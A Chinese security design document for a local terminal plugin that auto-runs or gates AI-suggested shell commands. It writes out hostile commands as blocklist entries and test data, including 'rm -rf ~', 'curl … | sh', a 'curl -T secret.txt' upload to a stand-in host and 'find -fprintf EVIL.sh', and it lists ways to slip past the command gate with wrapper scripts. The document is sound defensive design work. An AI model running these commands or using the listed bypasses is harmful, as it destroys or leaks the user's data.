# 安全模型

> 状态：设计已定，代码未开始。最后更新：2026-11-22
> 事实源：本仓库 `docs/architecture.md`、`docs/pty-notes.md`、`docs/platform-notes.md` 与 `.trellis/spec/`；PTY 侧原始数据来源见 `docs/pty-notes.md` 第 2 节。
> 本文的收紧项均为本仓库自有约束；标注「附加约束」的条目是本文新增的收紧项。

---

## 1. 威胁模型

本项目的攻击面不是「公网服务」，而是**一个能执行任意本地命令的 HTTP 服务，恰好跑在用户自己的机器上**。因此威胁全部来自本机与浏览器侧，而不是远程扫描器。

| # | 威胁 | 攻击者能做到什么 | 对应防线 | 残余风险 |
|---|---|---|---|---|
| 1 | 本机其他进程伪造请求 | 任何同用户进程都可以 `fetch http://127.0.0.1:3480/api/...`，如果服务没有鉴权，等于给全机进程开了一个命令执行接口 | 每个 `/api/*` 与 WebSocket 升级都要求 32 字节 hex token，`timingSafeEqual` 比对（见第 2 节） | 同用户进程可读 `caller-keys.json`、可读插件目录、理论上可读进程内存；token 挡的是「不知道 token 的进程」，不是「同用户恶意进程」 |
| 2 | 别的网页经浏览器借道 | 用户用同一个浏览器打开任意网页，该网页脚本向 `127.0.0.1:3480` 发请求（简单请求无需预检）。若服务无 Origin/Token 校验，网页即可驱动本机终端 | `Origin` 白名单 + 每请求 token；浏览器侧网页拿不到 token（token 只出现在应用页 HTML 里，跨源读不到） | 若 token 曾出现在 URL，会经 Referer / 历史泄漏（本文禁止，见第 5 节） |
| 3 | DNS 重绑定 | 攻击者控制的域名解析到 `127.0.0.1`，页面同源策略被绕过，脚本对本地服务发起「同源」请求，读响应 | `Host` 头必须等于 `127.0.0.1:3480` 或 `localhost:3480`；重绑定后浏览器发出的 `Host` 是攻击者域名，直接 403 | 无（Host 校验是该攻击的标准解） |
| 4 | 恶意命令被 AI 自动执行 | 模型给出 `rm -rf ~`、`curl … \| sh`、`npm i` 之类命令，UI 不弹确认直接跑，用户来不及看 | 命令分级 fail-closed（见第 3 节）：只有「切得开 + 每段命令头在只读白名单 + 无重定向」才自动执行，其余一律弹确认卡 | 分级器只做字符串级判断，包装脚本可绕过（见第 6 节，已知限制） |
| 5 | 日志 / 凭据泄漏 | 凭据被写进日志、URL、异常栈、HTTP 响应，随后被 `app.log` 或浏览器历史带走 | secret 只在内存中读，绝不写日志、绝不进 URL、绝不出现在任何响应；token 只在内存与页面 HTML 里，不落盘（见第 5 节） | 本机任何同用户进程可直接读 `caller-keys.json`（实测可读），这条防不住，只能不复制、不外发 |
| 6 | 只读命令把凭据读进 AI 上下文（附加约束） | `cat` 属只读白名单，AI 自动跑 `cat C:/Users/41807/.config/magpie/caller-keys.json`，输出被「回喂继续解释」送进网关请求 → secret 离开本机进程边界 | 输出回喂前做遮罩：长 `sk-` 串替换为 `sk-***`；遮罩在本地做，不依赖网关侧 redact 设置 | 遮罩是正则级的，自定义格式的密钥可能漏过；因此白名单里不放「能读任意路径且无法预判」的组合命令 |

**威胁 4 与 5 的关系**：分级器防「跑坏命令」，凭据处理防「跑对命令但把秘密带出去」，两者不可互相替代。

---

## 2. 服务暴露面

### 2.1 只监听 `127.0.0.1:3480`

| 项 | 值 | 为什么 |
|---|---|---|
| 绑定地址 | `127.0.0.1` | 只接受本机 loopback。绑 `0.0.0.0` 会同时监听 Wi-Fi / 有线网卡，同网段任何设备（含不可信 Wi-Fi）都能连上这个能执行命令的服务 |
| 端口 | `3480` | `docs/platform-notes.md` 第 1.2 节实测：3480 空闲；3425 是网关、3477 是 page-chat、3488 是 agent-console 的 gate、3496 是 model-quota |
| 健康标志 | `app.log` 出现 `plugin: [magpie-terminal] listening on http://127.0.0.1:3480` | 与 magpie 其他插件同格式，便于运维一眼确认监听地址是 loopback 而不是 `0.0.0.0` |

反例（本机既有事实）：`C:/Users/41807/.config/magpie/gateway.json` 是 `{"addr":"[::]:3425"}`，即网关监听所有网卡。本项目**不跟随**这个做法，因为终端的能力远大于网关（网关最多花 token，终端能删文件）。

`0.0.0.0` 的额外代价：Windows 防火墙会为监听非 loopback 的进程弹授权框，用户一旦点「允许」，暴露面就永久留在系统里 —— 这是不可撤回的副作用。

### 2.2 `Host` 头校验（防 DNS 重绑定）

```
Host ∈ { "127.0.0.1:3480", "localhost:3480" }   // 其余一律 403
```

- 为什么必须带端口：浏览器对非默认端口会把端口写进 `Host`，只比主机名会放过 `evil.com:3480` 之外的变体；带端口做全等比较最简单且无歧义。
- 为什么要在**每个**请求上校验（含 WS 升级）：DNS 重绑定不区分请求类型，WebSocket 握手同样会被重绑定后的域名发起。
- 为什么不用 `startsWith('127.0.0.1')`：`127.0.0.1.evil.com` 这类字符串会通过前缀匹配。

### 2.3 每请求 token

| 项 | 设计 | 为什么 |
|---|---|---|
| 生成 | 进程启动时 `crypto.randomBytes(32)` → 64 个 hex 字符 | 32 字节 = 256 bit 熵，暴力枚举不可行；hex 便于放进 HTML 与头部 |
| 传递（HTTP） | 请求头 `x-magpie-term-token: <64 hex>` | 不进 URL：URL 会进日志、进 Referer、进浏览器历史 |
| 传递（WS） | query `?token=<64 hex>` | 浏览器 `WebSocket` 构造函数无法设置自定义头，所以 WS 只能用 query（GET 的 query 不进 Referer；我们的访问日志只记 pathname，不记 query） |
| 交付（页面 → 前端） | 服务端把口令注入应用页 HTML 的 `<meta name="magpie-term-token" content="…">` | **不能用 cookie**（第 6 轮实测）：插件页在 `<iframe sandbox="allow-scripts">` 里，文档是 opaque origin，`document.cookie = …` 抛 `SecurityError`，跨源请求也不会带我们的 cookie。官方 page-chat 用的也是 meta 注入 |
| CORS | 静态资源与 `/api/*` 都带 `access-control-allow-origin`（`Origin: null` → `null`）+ `access-control-allow-headers: content-type, x-magpie-term-token`；`OPTIONS` 先回 204 | 沙箱里 `type="module"` 是 CORS 请求，没有 ACAO 就被拦（`blocked by CORS policy`），`app.js` 及其 `import` 全部不执行。`OPTIONS` 预检不带口令，不能要求 token |
| 比对 | 先比长度，长度不等直接 403；长度相等再 `crypto.timingSafeEqual` | `timingSafeEqual` 在长度不等时**抛异常**，必须先挡；长度固定为 64，不构成信息泄漏 |
| 失败响应 | 一律 `403`，空 body，不带任何 `WWW-Authenticate` | 401 会触发浏览器凭据弹窗并暴露「服务存在且需要认证」；统一 403 + 空 body 不区分「没带 token」与「token 错」 |
| 生命周期 | 进程重启即换新 token，旧 token 立即失效；不持久化 | token 是能力凭证，落盘就等于给同用户进程一个长期后门 |

### 2.4 `Origin` 白名单

```
Origin === undefined            // 非浏览器客户端（curl、本地脚本）
Origin === "null"               // 沙箱 iframe 的 opaque origin（字面量字符串）
Origin === "http://127.0.0.1:3480"
Origin === "http://localhost:3480"
// 其余一律 403
```

**为什么沙箱 iframe 的 `Origin` 是字符串 `"null"`**：magpie 把插件页渲染成 `<iframe sandbox="allow-scripts" referrerpolicy="no-referrer">`（`docs/platform-notes.md` 第 2 节），`sandbox` 里**没有** `allow-same-origin`，于是文档处于 opaque origin。HTML 标准规定 opaque origin 序列化后的结果就是字面量 `"null"`，浏览器在跨源请求里发的就是 `Origin: null`。所以服务端必须把字符串 `"null"` 当合法值 —— 这不是「放行所有 null」，而是放行「沙箱里的那一类页面」，真正的门禁是 token。

同理，CSP 里的 `sandbox allow-scripts` 让页面 `connect-src 'none'`（`docs/platform-notes.md` 第 2 节），页面自己不能 fetch，必须 `location.replace()` 跳到本地服务变成普通页面 —— 跳到 `127.0.0.1:3480` 之后 `Origin` 就是自身，这也是白名单里要放自身的原因。

**`undefined` 为什么必须放行**：`curl` 和小脚本不发 `Origin`。若拒绝 `undefined`，V1 核验的所有 curl 用例都无法构造。放行它不降低安全性，因为 Origin 校验本来就是**浏览器侧**防线，非浏览器客户端由 token 挡。

**Origin 校验的真正作用点是 WebSocket**：WS 不受同源策略约束（没有 CORS 预检），所以「别的网页连我的 WS」只能靠 Origin 拦。HTTP 侧还有 token 兜底，WS 侧 Origin 是主要防线。

---

## 3. 命令分级（只作用于 AI 建议的命令）

### 3.1 判定流程

```
输入：一条命令字符串
  ↓
1) 按分隔符切段：&&  ||  ;  |
  ↓ 切不开（引号不配对 / 出现无法解析的构造）→ 确认
2) 每段取命令头（第一个 token，去环境变量前缀、去路径只留 basename）
  ↓
3) 任一段命中黑名单        → 确认
   任一段不在只读白名单    → 确认
   整条命令出现 > 或 >>     → 确认（不看上下文，一律确认）
  ↓ 全部通过
4) 自动执行
```

**fail-closed 原则**：判不准就走确认，不是判不准就放行。上面每一步的「异常出口」都指向确认卡，没有任何一条异常路径指向自动执行。

### 3.2 切分规则

| 构造 | 处理 | 为什么 |
|---|---|---|
| `&&` `\|\|` `;` `\|` | 切段，逐段审 | 这四种是最常见的串联方式，切段后每段独立判定，避免「`ls && rm -rf` 因为命令头是 `ls` 而放行」 |
| 引号内的上述字符 | 不切，作为字面量 | `echo "a;b"` 里的 `;` 不是分隔符；处理方式是最小词法器（只认单/双引号与反斜杠），不做完整 shell 解析 |
| `&`（后台）、换行 | 视为「切不开」→ 确认 | 多出一条独立的命令通道，切段模型覆盖不到 |
| `$( )`、反引号、`${ }` 之外的替换构造 | 视为「切不开」→ 确认 | 命令替换会在判定之后才展开，白名单看到的字符串与实际执行的不是同一个东西 |
| `\| sh`、`\| bash`、`\| python`、`\| node`、`eval`、`source`、`.` | 视为黑名单 → 确认 | 把「一段文本」变成「一次代码执行」，等价于任意命令 |
| 引号不配对、结尾是 `\` | 视为「切不开」→ 确认 | 说明分词器没读懂这条命令，不能假设它无害 |

### 3.3 只读白名单（可自动执行）

分两层：**命令头**判定（默认只看头）+ **参数级允许集**（对参数能改语义的命令，见 3.4）。入榜条件是「这条命令在任何被允许的参数下都不会写盘 / 不会改环境 / 不会外发」；做不到这一点的命令要么按允许集收紧（`curl`、`git`、`rg`、`wc`），要么整条移出白名单（`find`）。

| 类别 | 命令头示例 | 备注 |
|---|---|---|
| 目录与文件查看 | `ls`、`dir`、`pwd`、`cd`、`tree` | `cd` 只改当前 shell 的 cwd，不写盘 |
| 文件内容读取 | `cat`、`head`、`tail`、`less`、`more`、`wc` | 只读；输出受第 1 节威胁 6 的遮罩保护 |
| 搜索 | `grep`、`rg`、`which`、`where`、`type` | 不含 `find`（见下） |
| 进程与端口 | `ps`、`tasklist`、`netstat`、`ss`、`lsof` | 「看看谁占着 3480」的最小集合 |
| 磁盘与系统信息 | `df`、`du`、`free`、`whoami`、`hostname`、`date`、`uname`、`systeminfo` | 全部只读 |
| 版本号 | `node -v`、`npm -v`、`git --version` | 只读 |
| git 只读子命令 | `git status`、`git log`、`git diff`、`git show`、`git branch`（**无位置参数**且参数 ⊆ `{-a,-r,-v,-vv,-l,--list,--show-current,--contains,--merged,--no-merged,--points-at}`） | 见下方「为什么按命令头判定就必须排除某些命令」与 3.4 |
| PowerShell 只读 | `Get-ChildItem`、`Get-Content`、`Get-Process`、`Get-NetTCPConnection`、`Select-String` | 默认 shell 为 bash；仅在回退到 PowerShell 时启用这一组（见 `docs/architecture.md` 第 7 节） |

**为什么按命令头判定就必须排除某些命令**（这是本设计最容易写错的地方）：

- `find` 不进白名单：`find . -delete`、`find . -exec rm {} \;` 是写操作，而命令头仍是 `find`。
- `sed` 不进白名单：`sed -i` 原地改文件。
- `sort` 不进白名单：`sort -o out.txt` 会写文件。
- `tee`、`xargs` 不进白名单：前者写文件，后者把参数变成另一条命令。
- `git branch -D` 不单列白名单条目：`git branch` 的只读性依赖参数，因此 `git` 只放 `status/log/diff/show` 四个子命令，`branch` 仅在无位置参数且参数落在只读允许集内时放行（参数级判断，见 3.4）。

### 3.4 参数级校验：用允许集，不用危险参数黑名单（2026-11-22 实测教训）

原先实现用的是「危险参数黑名单」（`DANGEROUS_ARGS`），实测被绕过，且**真落盘**：

```text
classify("find . -fprint PWNED.txt")                 -> auto → 文件被创建
classify("find . -fprintf EVIL.sh 'echo hacked\n'")  -> auto → 脚本写入磁盘
classify("curl -I -T secret.txt http://x/")           -> auto → 上传文件
classify("curl -I -K evil.cfg")                       -> auto → 配置文件可注入 output=
classify("git branch side-effect-branch")             -> auto → 分支被创建
```

这与 3.3 开头「黑名单永远列不全」是同一个错误，只是发生在参数层。修正后的口径：

1. 参数能改语义的命令（`curl`、`git`、`rg`、`wc`）必须做参数级校验：命令行里**每个以 `-` 开头的参数**都必须落在该命令的只读允许集内，任一不在 → 确认。位置参数（不以 `-` 开头）对只读命令视为安全操作数。
2. `find` 的参数空间过大（`-fprint`/`-fprintf`/`-fls`/`-fprint0`/`-delete`/`-exec`/`-ok` 都会写盘或执行命令），**整条移出白名单**，一律确认。文件检索用 `ls`、`rg -n`、`rg --files`。
3. 短选项与长选项同等对待（`-delete` / `--delete`），测试要同时覆盖两种写法。
4. 不要把整条命令从白名单删掉当通用解法：`curl -I`、`git status/log/diff`、`ls`、`rg` 是每天的核心用法，全删等于废掉自动执行这条路。只有 `find` 是例外。

### 3.4 黑名单（必须确认）

| 命令头 / 构造 | 为什么必须确认 |
|---|---|
| `rm`、`del`、`rmdir`、`rd` | 删除不可逆；`rm -rf` 一次可清空整个目录树 |
| `mv`、`rename` | 覆盖同名目标时等同删除，且不可撤销 |
| `cp`、`copy`、`xcopy`、`robocopy` | 覆盖写入；`robocopy /MIR` 会镜像删除目标侧多余文件 |
| `npm i`、`npm install`、`pnpm add`、`yarn add` | 改动依赖树，且会执行依赖的 postinstall 脚本 = 任意代码执行 |
| `pip install`、`conda install` | 同上，且可能改全局 Python 环境 |
| `git push` | 外发到远端，撤回成本高（force push 可能已覆盖他人提交） |
| `git reset`、`git checkout --`、`git clean` | 丢工作区未提交改动，不可恢复 |
| `sudo`、`runas`、`Start-Process -Verb RunAs` | 提权，逃出当前用户边界 |
| `chmod`、`chown`、`attrib`、`icacls` | 改权限，可能让文件对更多主体可见 |
| `kill`、`taskkill`、`Stop-Process` | 杀进程，可能杀掉用户没保存的工作 |
| `curl`、`wget`、`Invoke-WebRequest` 后接执行（`\| sh`、`-o` 落盘） | 下载即执行；单纯 `curl -I` 也在黑名单里，因为按命令头判定无法区分 |
| `> `、`>>` | 重定向写文件：`>` 覆盖、`>>` 追加。**只要出现就确认**，不判断目标是不是 `/dev/null`，因为目标可能是符号链接或设备路径 |
| `format`、`diskpart`、`reg delete`、`shutdown`、`reboot` | 破坏系统级状态 |
| 无法归类的任何命令头 | 白名单之外即确认，默认拒绝 |

### 3.5 确认卡的行为约束（附加约束）

| 约束 | 为什么 |
|---|---|
| 卡片展示的命令字符串必须与实际执行的字符串**完全相同**（同一个变量，不重新拼接） | 防止展示 `ls` 而执行 `ls; rm -rf /`（判定与执行之间的替换） |
| 不做折行隐藏、不截断、不省略中间段 | 长命令截断会让用户点「执行」时看不到后半段的破坏性操作 |
| 用户不点「执行」就绝不落键盘输入 | 验收 5 的判定标准即「不点不动」 |
| 「复制」与「执行」是两个独立动作，复制不触发执行 | 用户常想先改再跑 |

---

## 4. 两条执行通道的不对称

| 通道 | 路径 | 是否需要分级 |
|---|---|---|
| AI 建议的命令 | AI 栏 → 分级器 → 自动执行或确认卡 | 是 |
| 用户手敲的命令 | xterm.js → WebSocket → PTY 写入 | 否，直接执行 |

**为什么这个不对称是合理的**：手敲时，用户本人就是授权者 —— 这个终端的全部意义是「用户自己的 shell」，他在键盘上敲的每个字符都是他自己的意图，再插一层确认只是在骚扰他（`rm` 在交互式 shell 里本来就有 shell 自己的确认/无确认语义）。分级器防的不是「危险命令」，而是「**模型生成、用户没逐字看过就被自动执行**的命令」。两者的授权主体不同，所以规则不同。

**边界情况**：AI 栏「执行」按钮把命令**写入 PTY** 而不是另开进程 —— 因此 AI 命令和手敲命令共用同一个 shell 状态（cwd、环境变量）。这意味着 AI 命令的副作用会累积到用户手敲的会话里，确认卡必须让用户意识到这一点（卡片上标「将在当前标签执行」）。

---

## 5. 凭据处理

### 5.1 `caller-keys.json`

| 项 | 事实 | 处理规则 |
|---|---|---|
| 路径 | `C:/Users/41807/.config/magpie/caller-keys.json` | 不复制、不缓存副本、不改写 |
| 结构 | JSON 数组，1 条，字段仅 `id` / `name` / `lan` / `secret`（FINDINGS 6a，`log/Q6-credentials-structure.log`） | 只按字段名取需要的值 |
| secret | 长度 62、前缀 `sk-`（`docs/platform-notes.md` 第 7.1 节；FINDINGS 6a） | **只在内存里读，绝不写日志、绝不进 URL、绝不出现在任何 HTTP 响应或错误栈里**；本文档不出现任何真实值 |
| 可读性 | 插件进程 `fs.accessSync(..., R_OK)` → true（FINDINGS 6a） | 视为「本机同用户进程都可读」，不做「藏起来」的假设 |

**关键结论：本项目默认不读这个文件。** magpie 网关对 loopback 请求不校验 `Authorization`（`docs/platform-notes.md` 第 7 节、FINDINGS 6d：不带任何 Authorization 也返回 200），所以「调网关」这件事不需要 key。只有「在 UI 上展示凭据状态」这类功能才读，且：

- 读一次，放内存，进程退出即消失；
- 只取 `name` / `id` 用于展示，`secret` 只取长度与前缀用于「是否配置」判断；
- 绝不把 `secret` 放进任何日志行、任何 URL query / fragment、任何 SSE/WS 消息。

**顺带的风险提示**：`settings.json` 里还有 `lan: true`、`lanKey`（长度 62）、`lanKeyId`（长度 24）（FINDINGS 6b）。读 `settings.json` 的代码会顺带把这些值读进内存 —— 因此读 settings 时只挑需要的顶层 key，不整体透传。

### 5.2 token

| 项 | 规则 | 为什么 |
|---|---|---|
| 存放 | 只在进程内存 + 页面 HTML 里 | 落盘（临时文件、`page/session.js`、localStorage 持久化）等于给同用户进程一个长期可用的凭证 |
| 不进 URL | 禁止 query string、禁止 fragment | URL 会进浏览器历史、Referer、代理日志、`app.log` 的请求行 |
| 不进日志 | 请求日志只记 `method` + `path`（去掉 query）+ 状态码 | 日志是最常见的凭据泄漏渠道 |
| 不进 env | 不把 token 塞进 PTY 子进程的环境变量 | 子进程里 `env` / `set` 就能打印出来，而 PTY 输出会被回喂给 AI |

> 待定：带路页 → 应用服务的 token 交接方式。选项 A：`server()` 在响应页面 HTML 时把 token 注入内存中的字符串（不写文件）；选项 B：仿 page-agent-console，把 gate key 写进 `page/session.js`（`docs/platform-notes.md` 第 3 节记载该插件用 gate 进程做 302 令牌交接）。推荐 A，理由是 B 会落盘且需要额外的清理逻辑。此项不影响第 2 节的校验规则，只影响交接实现。

---

## 6. 已知残余风险

| # | 残余风险 | 实测 / 依据 | 缓解 | 是否可消除 |
|---|---|---|---|---|
| 1 | 本机任何同用户进程可读 `caller-keys.json` | FINDINGS 6a：`fs.accessSync(..., R_OK)` → true，字段 `id`/`name`/`lan`/`secret` | 不复制、不落盘、不进日志；把「读完即用、用完即弃」写进实现约束 | 否。这是 magpie 既有配置的权限模型，非本项目引入 |
| 2 | WebView2 规避措施是**全机用户级**环境变量 | `docs/platform-notes.md` 第 6 节：`setx WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS "--disable-features=IsolateSandboxedIframes"` | 仅在「所有插件页同时坏」时使用；用后按 `docs/platform-notes.md` 第 6.5 节给的命令撤销（`reg delete HKCU\Environment /v WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS /f`）并完全退出托盘重开 | 否。这是平台 workaround，属安全让步：关闭 `IsolateSandboxedIframes` 会削弱**所有** WebView2 应用的进程隔离（缺 `allow-same-origin` 的沙箱 iframe 不再独立进程），不只影响 magpie |
| 3 | 分级器只做命令头字符串匹配，包装脚本可绕过 | 设计本身：白名单按命令头判定 | 见下 | 否。属模型能力边界 |
| 4 | 只读命令可把任意可读文件内容显示在终端 | `cat` 在白名单内 | 输出回喂前做 `sk-` 遮罩；确认卡上标明「输出会发给模型」 | 部分 |

### 6.1 分级器绕过的具体形态（已知限制）

以下写法会让「命令头」看起来无害，但实际执行任意内容：

| 绕过写法 | 为什么绕过 | 缓解建议 |
|---|---|---|
| `sh -c '...'`、`bash -lc '...'`、`bash -c "$(...)"` | 命令头是 `sh` / `bash`，真实命令在参数里 | `sh`、`bash`、`zsh`、`pwsh`、`powershell`、`cmd` 一律进黑名单（按命令头就拦得住这一层） |
| `python -c '...'`、`node -e '...'`、`perl -e` | 命令头是解释器，参数是代码 | 解释器 + `-c`/`-e`/`-` 组合进黑名单；纯 `python script.py` 也进黑名单（脚本内容不可见） |
| `echo '...' \| sh` | 第二段命令头是 `sh` | 已在 3.2 表里按黑名单处理 |
| `alias`、函数定义、`.bashrc` 改写 | 改变后续 `ls` 的真实行为 | `alias`、`unalias`、`export`、`.bashrc`/`$PROFILE` 写入进黑名单 |
| `xargs`、`find -exec`、`parallel` | 把参数变成命令 | 三者都不进白名单（`xargs`、`find` 已在 3.3 排除） |
| 复制粘贴的「看起来像 ls」的 Unicode 同形字 | 命令头字符串不等于 `ls` | 白名单用精确匹配，同形字自然落到「未命中 → 确认」，fail-closed 天然挡住 |

**明确写死的一条**：分级器不是沙箱，不提供隔离、不做权限降级、不拦网络。它的定位是「减少用户需要逐字检查的命令量」，不是「保证危险命令不会被执行」。真正的安全边界是「用户点不点那张确认卡」。

---

## 7. 安全测试清单（可判真假的断言）

前置：应用服务已启动，`$TOKEN` 为页面 HTML 里的 64 位 hex token，`$BASE=http://127.0.0.1:3480`。

### 7.1 鉴权矩阵

| # | 构造 | 预期 | 判定依据 |
|---|---|---|---|
| S1 | `curl -s -o /dev/null -w '%{http_code}' -H "x-magpie-term-token: $TOKEN" -H 'Origin: http://evil.example' $BASE/api/health` | `403` | Origin 不在白名单 |
| S2 | `curl -s -o /dev/null -w '%{http_code}' -H "x-magpie-term-token: $TOKEN" -H 'Host: evil.example' $BASE/api/health` | `403` | Host 不等于 `127.0.0.1:3480` / `localhost:3480` |
| S3 | `curl -s -o /dev/null -w '%{http_code}' -H 'Host: 127.0.0.1:3480' $BASE/api/health` | `403` | 缺 token |
| S4 | `curl -s -o /dev/null -w '%{http_code}' -H 'Host: 127.0.0.1:3480' -H "x-magpie-term-token: $(printf '0%.0s' {1..64})" $BASE/api/health` | `403` | token 长度对但内容错 |
| S5 | `curl -s -o /dev/null -w '%{http_code}' -H 'Host: 127.0.0.1:3480' -H 'x-magpie-term-token: short' $BASE/api/health` | `403`（不 500） | 长度不等必须先挡，`timingSafeEqual` 不得抛到外层 |
| S6 | WS 升级走同一套校验：`curl -s -o /dev/null -w '%{http_code}' -H 'Host: 127.0.0.1:3480' -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" -H 'Origin: http://evil.example' -H "x-magpie-term-token: $TOKEN" $BASE/ws` | `403` | 不能只在 HTTP 路由上挂中间件；把 S1–S5 的 header 组合逐个套到这条 WS 请求上，仍须全部 403 |
| S7 | `curl -s -o /dev/null -w '%{http_code}' -H "x-magpie-term-token: $TOKEN" -H 'Origin: null' $BASE/api/health` | `200` | 沙箱 iframe 的合法路径，必须放行（否则页面自己连不上） |
| S8 | `curl -s -o /dev/null -w '%{http_code}' -H "x-magpie-term-token: $TOKEN" $BASE/api/health`（不带 Origin） | `200` | 非浏览器客户端的合法路径 |

### 7.2 命令分级

判定口径（本节全部条目共用）：把「输入」原样贴进 AI 栏回车，观察两件事 —— 终端有无新输出、AI 栏有无确认卡。

- 判「自动执行」= 终端出现输出，且 AI 栏没有确认卡。
- 判「弹确认卡」= AI 栏出现确认卡，且终端**在点「执行」之前没有新输出**（点「取消」后仍无新输出）。只看有没有卡不算数：卡弹了但命令已经跑了，就是不通过。

| # | 输入（AI 栏） | 预期 | 判定依据 |
|---|---|---|---|
| S9 | `ls` | 自动执行，输出可见 | 白名单命中 |
| S10 | `ls && pwd` | 自动执行 | 切段后两段都命中白名单 |
| S11 | `ls > /tmp/out.txt` | 弹确认卡，未点前终端无新输出 | 出现 `>` |
| S12 | `ls >> log.txt` | 弹确认卡 | `>>` 以 `>` 开头 |
| S13 | `rm -rf ~/tmp` | 弹确认卡，未点前文件仍在 | 黑名单 |
| S14 | `ls; rm -rf ~/tmp` | 弹确认卡（不能因为第一段是 `ls` 就放行） | 切段后第二段命中黑名单 |
| S15 | `bash -lc 'rm -rf ~/tmp'` | 弹确认卡 | 命令头 `bash` 在黑名单 |
| S16 | `echo "a;b"` | 自动执行，输出 `a;b` | 引号内分隔符不切段 |
| S17 | `ls "unclosed` | 弹确认卡 | 引号不配对 → 切不开 → 确认 |
| S18 | `find . -delete` | 弹确认卡 | `find` 不在白名单（未命中 → 确认） |
| S19 | 用户**手敲** `rm -rf ~/tmp` | 直接执行，不弹卡 | 手敲通道不走分级器（第 4 节） |

### 7.3 凭据与日志

| # | 构造 | 预期 | 判定依据 |
|---|---|---|---|
| S20 | 跑完 S1–S19 后 `grep -c 'sk-' C:/Users/41807/AppData/Local/magpie/logs/app.log` | `0` | 日志无 secret 前缀串 |
| S21 | `grep -c "$TOKEN" C:/Users/41807/AppData/Local/magpie/logs/app.log` | `0` | 日志无 token |
| S22 | 访问 `$BASE/api/health?token=$TOKEN` 后 `grep -c "$TOKEN" C:/Users/41807/AppData/Local/magpie/logs/app.log` | `0`（日志里出现 token 即判失败，无论是 URL 还是别的字段） | token 不进 URL 的落地检查 |
| S23 | 触发一次 `/api/keys`（若实现）响应，对响应体做 `grep -c "$SECRET"` | `0`；允许出现长度/前缀，出现完整 secret 即判失败 | 5.1 的响应约束 |

### 7.4 进程与暴露面

| # | 构造 | 预期 | 判定依据 |
|---|---|---|---|
| S24 | `netstat -ano \| grep 3480` | 只有 `127.0.0.1:3480`，没有 `0.0.0.0:3480` 或 `[::]:3480` | 2.1 的绑定约束 |
| S25 | 在另一台同 LAN 机器上执行 `curl -m 3 http://<LAN_IP 由下条命令取得>:3480/api/health`（本机先用 `ipconfig \| grep -i "IPv4"` 取地址） | 连接失败 / 超时（预期 curl exit 7 或 28），不是 403、不是 200 | 同上，反向证明未监听网卡 |
| S26 | 关标签 / 退出 magpie 后，按 `docs/pty-notes.md`「孤儿进程排查」里的 `Get-CimInstance Win32_Process` 命令核 `bash.exe` 的 `ParentProcessId` | 无残留 `bash.exe`（父 shell 已退且子进程已随之消失） | 验收 7 |

---

## 8. 待定

| 项 | 选项 | 推荐 |
|---|---|---|
| token 交接方式（带路页 → 应用页） | A 内存注入 HTML / B 写 `page/session.js` | A（不落盘） |
| WS token 载体 | A 子协议 / B query string | A（不进 URL）；若某浏览器不支持，退到 B 并确保访问日志剥 query |
| 页面刷新后的 token 复用 | A 重新走带路页 / B `sessionStorage` | A（不落盘，代价是多一次跳转） |
| 分级器是否做参数级判断 | A 只做命令头（当前设计）/ B 对少数命令做参数级 | A + `git branch` 一处例外；B 的维护成本高于收益 |
| 失败鉴权的限速 | A 不做 / B 做 | A：32 字节随机不可暴力破解，限速只会引入状态与误封 |
